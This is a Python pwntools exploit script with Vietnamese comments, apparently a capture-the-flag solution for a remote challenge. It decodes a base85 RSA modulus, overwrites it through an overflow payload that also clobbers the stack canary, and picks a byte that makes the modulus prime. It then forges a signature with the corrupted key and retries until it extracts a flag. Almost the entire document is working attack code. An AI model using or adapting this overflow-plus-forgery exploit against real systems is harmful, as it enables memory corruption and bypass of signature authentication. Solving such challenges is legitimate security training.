from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse
from hashlib import sha256
import re

# ==========================================
# CẤU HÌNH
# ==========================================
context.log_level = 'info'
HOST = 'challenge.cnsc.com.vn' 
PORT = 32244

BASE85_ALPHABET = b"!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstu"
B85_MAP = {c: i for i, c in enumerate(BASE85_ALPHABET)}

# Tạo list số nguyên tố nhỏ để lọc nhanh (Sieve)
# Giúp code chạy cực nhanh, không bị timeout khi tính toán
def get_small_primes(n):
    sieve = [True] * n
    for i in range(3, int(n**0.5) + 1, 2):
        if sieve[i]:
            sieve[i*i::2*i] = [False] * ((n - i*i - 1) // (2*i) + 1)
    return [2] + [i for i in range(3, n, 2) if sieve[i]]

SMALL_PRIMES = get_small_primes(5000)

def decode_b85_output(s):
    try:
        out = b""
        for i in range(0, len(s), 5):
            chunk_s = s[i:i+5]
            if len(chunk_s) < 5: break
            val = 0
            for c in chunk_s:
                val = val * 85 + B85_MAP[c]
            out += long_to_bytes(val, 4)
        return out
    except: return b""

def encode_b85_input(data):
    out = b""
    for i in range(0, len(data), 4):
        chunk_val = bytes_to_long(data[i:i+4])
        chars = []
        for _ in range(5):
            chars.append(BASE85_ALPHABET[chunk_val % 85])
            chunk_val //= 85
        out += bytes(chars[::-1])
    return out

def solve():
    count = 0
    log.info("Starting exploit... Please be patient (approx 20-50 retries needed).")
    
    while True:
        count += 1
        r = None
        try:
            r = remote(HOST, PORT, level='error') # Giảm log connect để đỡ rối mắt
            
            # 1. Nhận N
            # Đôi khi server chưa kịp gửi N, cần recvuntil cẩn thận
            r.recvuntil(b"N = ")
            n_b85 = r.recvline().strip()
            N_bytes = decode_b85_output(n_b85)
            
            if len(N_bytes) != 384:
                r.close()
                continue
                
            N = bytes_to_long(N_bytes)
            
            # 2. Tìm N' (Prime)
            # Thay vì check 100 triệu số, ta chỉ check 85 trường hợp với bộ lọc thông minh
            found = False
            prime_N = 0
            magic_char = 0
            
            n_mutable = bytearray(N_bytes)
            
            # Thử thay đổi byte đầu tiên (MSB)
            for char_code in BASE85_ALPHABET:
                n_mutable[0] = char_code
                candidate_N = bytes_to_long(n_mutable)
                
                # Check 1: Lọc bằng phép chia (Rất nhanh)
                is_composite = False
                for p in SMALL_PRIMES:
                    if candidate_N % p == 0:
                        is_composite = True
                        break
                if is_composite: continue 

                # Check 2: Fermat Test (Chỉ chạy khi đã qua lọc)
                if pow(2, candidate_N - 1, candidate_N) == 1:
                    log.success(f"[Try #{count}] FOUND PRIME N'! Char: {chr(char_code)}")
                    prime_N = candidate_N
                    magic_char = char_code
                    found = True
                    break
            
            if not found:
                # Không tìm thấy prime trong lượt này, đóng kết nối và thử N mới
                print(f"\r[Try #{count}] Searching...", end='')
                r.close()
                continue
            
            # 3. Tính toán chữ ký giả
            log.info("Forging signature...")
            target_msg = b"1_d4r3_y0u_70_519n_7h15_3x4c7_51x7y_f0ur_by73_57r1n9_w17h_my_k3y"
            h_target = bytes_to_long(sha256(target_msg).digest())
            e = 0x10001
            
            d_prime = inverse(e, prime_N - 1)
            sig_forge = pow(h_target, d_prime, prime_N)
            sig_bytes = long_to_bytes(sig_forge, 384)
            sig_payload = encode_b85_input(sig_bytes)
            
            # Payload làm hỏng N: 79 ký tự rác + 1 ký tự magic
            payload_overflow = b'!' * 79 + bytes([magic_char])

            # 4. Gửi Exploit
            
            # --- Giai đoạn 1: Gửi payload overflow ở Option 0 ---
            log.info("Sending overflow payload...")
            r.sendlineafter(b"Verify(1): ", b"0")
            r.recvuntil(b"base85:\n")
            r.sendline(payload_overflow)
            
            # QUAN TRỌNG: Phải đọc hết output của Option 0 để không bị kẹt
            r.recvuntil(b"sig = ")
            r.recvline() 
            
            # --- Giai đoạn 2: Gửi chữ ký giả ở Option 1 ---
            log.info("Sending forged signature...")
            r.sendlineafter(b"Verify(1): ", b"1")
            r.recvuntil(b"base85:\n")
            r.sendline(sig_payload)
            
            # 5. Nhận Flag
            # Do ta ghi đè Canary nên chương trình sẽ crash sau khi in flag
            # Cần recvall để bắt flag trước khi kết nối bị ngắt
            response = r.recvall(timeout=5)
            
            if b"W1{" in response:
                print("\n\n" + "="*40)
                try:
                    flag = re.search(b"W1{.*}", response).group().decode()
                    print(f"FLAG: {flag}")
                except:
                    print(response)
                print("="*40 + "\n")
                break
            else:
                log.error("Verification failed (Signature mismatch?). Retrying...")
                r.close()

        except KeyboardInterrupt:
            break
        except Exception as e:
            if r: r.close()

if __name__ == "__main__":
    solve()